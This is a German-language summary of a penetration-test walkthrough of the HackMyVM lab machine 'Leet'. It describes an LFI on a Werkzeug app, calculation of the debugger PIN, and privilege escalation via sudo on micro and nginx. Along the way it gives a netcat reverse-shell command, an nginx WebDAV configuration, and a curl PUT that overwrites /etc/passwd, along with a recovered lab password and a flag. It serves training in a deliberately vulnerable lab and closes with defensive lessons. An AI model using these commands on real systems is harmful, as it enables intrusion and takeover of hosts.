# Leet - HackMyVM - Hard

**Schwierigkeitsgrad:** Hard 🔴

---

## ℹ️ Maschineninformationen

*   **Plattform:** HackMyVM
*   **VM Link:** [https://hackmyvm.eu/machines/machine.php?vm=Leet](https://hackmyvm.eu/machines/machine.php?vm=Leet)
*   **Autor:** DarkSpirit

![Leet Machine Icon](leet.png)

---

## 🏁 Übersicht

Dieser Bericht dokumentiert den Penetrationstest der virtuellen Maschine "Leet" von HackMyVM. Das Ziel war die Erlangung von Systemzugriff und die Ausweitung der Berechtigungen bis auf Root-Ebene. Die Maschine wies kritische Schwachstellen auf, darunter eine Local File Inclusion (LFI), die zur Kompromittierung eines Werkzeug Debuggers und initialer Remote Code Execution (RCE) als Benutzer `www-data` führte. Die Privilegien-Eskalation wurde über eine misskonfigurierte Sudo-Berechtigung für den `micro`-Editor ausgenutzt, um SSH-Zugriff als Benutzer `riva` zu erlangen, gefolgt von einer weiteren Sudo-Schwachstelle für Nginx, die über das Auslesen eines Passworts aus Firefox-Daten und das Überschreiben der `/etc/passwd` Datei zur Erlangung von Root-Rechten führte.

---

## 📖 Zusammenfassung des Walkthroughs

Der Pentest gliederte sich in folgende Hauptphasen:

### 🔎 Reconnaissance

*   Identifizierung der Ziel-IP (192.168.2.44) im lokalen Netzwerk mittels `arp-scan`.
*   Hinzufügen des Hostnamens `leet.hmv` zur lokalen `/etc/hosts`.
*   Umfassender Portscan (`nmap`) zur Identifizierung offener Ports (Port 22 - SSH OpenSSH 9.2p1, Port 7777 - HTTP Werkzeug httpd 3.0.1) und OS-Erkennung.
*   Prüfung der HTTP-Header auf Port 7777 mittels `curl`.

### 🌐 Web Enumeration

*   Automatisiertes Scanning des Webservers auf Port 7777 mit `nikto`, der fehlende Sicherheits-Header, erlaubte HTTP-Methoden (`POST, GET, OPTIONS, HEAD`) und interessante Pfade wie `/console` und `/#wp-config.php#` aufdeckte.
*   Verzeichnis-Brute-Force mit `gobuster` identifizierte den Endpunkt `/download` (Status: 500).
*   Analyse des `/download`-Endpunkts zeigte einen detaillierten Werkzeug Debugger Traceback und das Vorhandensein des Debugger-SECRETs im Quellcode.
*   Entdeckung einer Local File Inclusion (LFI) Schwachstelle im `filename`-Parameter von `/download`, die eine Umgehung der Path-Validation mittels Verzeichnis-Traversal ermöglichte.

### 💻 Initialer Zugriff

*   Ausnutzung der LFI-Schwachstelle zum Auslesen von `/etc/passwd` und `/etc/machine-id` zur Sammlung von Systeminformationen.
*   Umrechnung der MAC-Adresse in einen Integer-Wert.
*   Zusammenstellung aller notwendigen Bausteine (Username `www-data`, Modulname, App-Name, App-Pfad, MAC-Integer, Machine-ID, Debugger SECRET) zur Berechnung des Werkzeug Debugger PINs.
*   Erstellung und Ausführung eines Python-Skripts (`pin_calc.py`) zur Berechnung des Debugger PINs (`142-855-714`).
*   Eingabe des berechneten PINs in die Werkzeug Debugger Konsole zur Freischaltung der interaktiven Python-Konsole.
*   Ausführung von Python-Code (`import os; os.system(...)`) in der Konsole zur Bestätigung der Berechtigungen (`www-data`) und Prüfung auf verfügbare Tools (`which nc`).
*   Initiierung einer Reverse Shell zum Angreifer-System mittels `nc -e /bin/bash ...` über die freigeschaltete Debugger-Konsole.
*   Erfolgreiche Erlangung einer stabilen Shell als Benutzer `www-data`.

### 📈 Privilege Escalation

*   Von der `www-data` Shell: Prüfung der `sudo`-Berechtigungen (`sudo -l`). Gefunden: `(riva) NOPASSWD: /usr/bin/micro`.
*   Enumeration des Home-Verzeichnisses von Benutzer `riva` (`ls -la /home/riva/`). Die Datei `user.txt` und das `.ssh` Verzeichnis wurden identifiziert.
*   Übertragung des Firefox-Profils von `riva` auf das Angreifer-System mittels `scp`.
*   Nutzung von `firefox_decrypt.py` zum Auslesen der im Firefox-Profil gespeicherten Passwörter. Dabei wurde das Passwort für Benutzer `riva` (`PGH$2r0co3L5QL`) gefunden.
*   Ausnutzung der `sudo` Berechtigung für `/usr/bin/micro` als `riva` (`sudo -u riva /usr/bin/micro /home/riva/.ssh/authorized_keys`) und Einfügen des öffentlichen SSH-Schlüssels des Angreifers in die `authorized_keys`-Datei.
*   Erfolgreiche passwortlose Anmeldung per SSH als Benutzer `riva`.
*   Von der `riva` Shell: Erneute Prüfung der `sudo` Berechtigungen (`sudo -l`) bestätigte den Eintrag `(root) /usr/sbin/nginx`, wofür nun das bekannte Passwort von `riva` verwendet werden konnte.
*   Erstellung einer bösartigen Nginx-Konfigurationsdatei (`nginx_pwn.conf` im schreibbaren `/tmp` Verzeichnis), die Nginx anweist, als `root` zu laufen, das System-Root-Verzeichnis (`/`) als Webroot zu verwenden und die WebDAV `PUT` Methode auf Port 4448 zu aktivieren (`user root; listen 4448; root /; dav_methods PUT;`).
*   Starten der bösartigen Nginx-Instanz mit Root-Rechten mittels `sudo -u root /usr/sbin/nginx -c /tmp/nginx_pwn.conf` unter Verwendung des Passworts von `riva`.
*   Erstellung einer modifizierten `/tmp/neue_passwd` Datei, die eine Kopie der Originaldatei sowie einen neuen Eintrag für Benutzer `dark` mit UID 0, GID 0 und einem bekannten Passwort enthält.
*   Ausnutzung der Nginx WebDAV PUT-Fähigkeit (laufend als Root auf Port 4448) zum Überschreiben der Datei `/etc/passwd` auf dem Zielsystem mit der modifizierten Datei (`curl -X PUT --data-binary @/tmp/neue_passwd http://127.0.0.1:4448/etc/passwd`).
*   Anmeldung als neuer Root-Benutzer `dark` mittels `su dark`.
*   Erfolgreiche Erlangung einer Root-Shell.

### 🚩 Flags

*   **User Flag:** Gefunden in `/home/riva/user.txt`
    ` [User Flag Wert hier einfügen] ` *(Hinweis: Der Wert der User Flag war im bereitgestellten Text nicht enthalten, nur der Speicherort.)*
*   **Root Flag:** Gefunden in `/root/r007_fl46.7x7`
    ` ca169772acb099a02ebab8da1d9070ea `

---

## 🧠 Wichtige Erkenntnisse

*   **Werkzeug Debugger Schwachstelle:** Die PIN-basierte Authentifizierung des Debuggers ist unsicher, wenn die zur PIN-Berechnung benötigten Systeminformationen (Username, Pfade, MAC, Machine-ID, SECRET) kompromittiert werden können. Ein aktivierter Debugger in Produktionsumgebungen ist ein kritisches RCE-Risiko.
*   **Local File Inclusion (LFI):** Eine LFI-Schwachstelle ermöglicht das Auslesen beliebiger Dateien und kann weitreichende Folgen haben (Informationslecks, Bausteine für andere Angriffe wie hier die Debugger-PIN-Berechnung). Strikte Input-Validierung und das Prinzip der geringsten Rechte sind essenziell.
*   **Unsichere Sudo-Konfigurationen:** `NOPASSWD`-Einträge oder die Erlaubnis, leistungsstarke Binaries (wie Editoren oder Webserver) mit erhöhten Rechten auszuführen, stellen direkte Privilegien-Eskalationspfade dar, insbesondere wenn die Passwörter der Benutzer kompromittiert werden können oder die Binaries manipulierbar sind.
*   **Passwort-Speicherung in Browsern:** Ungeschützte Passwörter in Browserprofilen stellen ein erhebliches Sicherheitsrisiko dar. Ein kompromittiertes Benutzerkonto kann schnell zur Kompromittierung weiterer Dienste oder erhöhter Berechtigungen führen, wenn Passwörter wiederverwendet oder in Browsern gespeichert werden.
*   **Nginx Fehlkonfiguration:** Das Starten von Nginx mit Root-Rechten, das Setzen des Webroots auf `/` und das Aktivieren von Methoden wie `PUT` kann das gesamte Dateisystem einem Angreifer aussetzen und direkten Schreibzugriff auf kritische Systemdateien ermöglichen.

---

## 📄 Vollständiger Bericht

Eine detaillierte Schritt-für-Schritt-Anleitung, inklusive Befehlsausgaben, Analyse, Bewertung und Empfehlungen für jeden Schritt, finden Sie im vollständigen HTML-Bericht:

[**➡️ Vollständigen Pentest-Bericht hier ansehen**](https://alientec1908.github.io/Leet_HackMyVM_Hard/)

---

*Berichtsdatum: 15. Juni 2025*
*Pentest durchgeführt von DarkSpirit*
